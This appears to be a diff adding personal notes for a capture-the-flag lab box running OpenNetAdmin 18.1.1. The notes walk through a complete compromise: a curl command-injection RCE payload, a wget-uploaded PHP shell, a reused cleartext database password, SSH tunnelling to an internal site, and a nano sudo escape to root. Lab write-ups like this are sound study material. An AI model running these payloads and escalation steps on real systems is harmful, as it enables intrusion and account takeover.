@@ -1,0 +1,76 @@
+Nmap scan showed Apache and ssh (it also showed a port 8080 being used, but after reset it wasn't there anymore, probably someone messing with it)
+Dirbuster showed openNetAdmin was accessible in 10.10.10.171/ona/. In there, it showed its version (18.1.1 I believe)
+Searchsploit (after update) showed an RCE vulnerability in this version, from 2nd half of 2019. The scripts weren't working very good, so I used a curl command instead
+	- curl -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/
+
+Once obtained RCE, you can go through the box and list files. First, achieve a reverse shell
+	- Upload a php by running wget, since www-data could only write in the webservices folder
+	- Then browse to this new php
+
+In /etc/passwd there are two users, jimmy and joanna
+Under /var/www the most important would be /opt/ona/, where you can find www/local/config/database_settings.inc.php. This is a file for mysql databases. In there, there's a clear text passwd: n1nj4W4rri0R! for the user: ona_sys
+Trying this password for jimmy and joanna grants access to jimmy via ssh
+
+But jimmy is not the user.txt user. It must be joanna.
+I attempted to extract information out of the mysql database, but it wasn't helpful
+	- Went through /etc/mysql/... found the port for it 3306
+	- Logged in and performed a dump of the DB (with credentials above), nothing interesting
+
+Linpeas didn't show anything interesting for jimmy, except for some files in /var/www/internal/, which were writable.
+These were main.php, logout.php, index.php. This was a login page, which compared username==jimmy password==sha512 hash. These files being modifiable, one can put the hash that you want.
+In main.php, there was a command being run -> cat /home/joanna/.ssh/id_rsa. Nice, we can get that. However, accesing that files wasn't doing it. We're still jimmy
+
+The breakthrough came when performing a netstat (ss -antup). There were some local ports open which weren't accessible from the outside world.
+Local Address		Foreign Address		State		PID/Program Name
+127.0.0.1:6010		0.0.0.0:*		LISTEN		-
+127.0.0.1:3306          0.0.0.0:*               LISTEN          -
+127.0.0.1:52846         0.0.0.0:*               LISTEN          -
+
+# nc 0 3306
+3306 is the mysql database, so no interest in that
+6010 is an X11 interface
+52846 seemed to be a webserver
+
+I went to the apache configuration files
+	- cat /etc/apache2/sites-available/internal.conf
+	- Defined a virtual host in 52846
+	- AssignUserID joanna joanna
+
+Nice, if we can log in to that port, with jimmy's credentials, then we will be joanna and we can run whatever command we want (via main.php) dropping ssh certs and even user.txt.
+
+So first, log in as jimmy doing port forwarding (ssh tunneling):
+	- ssh -L 4444:127.0.0.1:52846 jimmy@10.10.10.171
+	- Then access localhost:4444 from a browser
+	- Modify index.php and main.php so that you can use the password you want and run the command you want (be careful to revert this back to original state because there seems to be a cron job checking for hashes in this folder, and reboots the machine)
+	- Input credentials and observe the output
+
+We can even achieve remote shell with this method.
+The cracking of the private key took some time, so I went with remote shelling like this
+To achieve root is pretty simple. After running linpeas/linenum as joanna, it jumps straight out that a sudoers.d file is readable by joanna:
+	- joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
+
+Great, nano is listed in GTFObins.
+	- CTRL-R CTRL-X
+	- reset; sh 1>&0 2>&0
+
+You have to export TERM=xterm first, since the terminal is quite bad for running nano (after doing the usual 
+        - python -c 'import pty;pty.spawn("/bin/bash")'
+        - CTRL-Z
+        - stty raw -echo
+        - fg + ENTER
+	- export TERM=xterm
+
+However, sudo doesn't work. There is a PERM_ROOT error as if sudo wasn't correctly loaded. This seems to be because we haven't actually logged in as joanna. So we need the keys
+
+The password was quite difficult to find. Had a little help to speed up the process in Reddit. I knew it started with bl. So that reduced considerably the search space. It was bloodninjas.
+
+Then just 
+	# Get private and public keys
+	# ssh -i joanna_rsa joanna@10.10.10.171
+	# sudo nano /opt/priv
+	Run GTFObins commands
+	You're root
+
+
+
+Useful command: find / -perm -u=s -type f 2>/dev/null
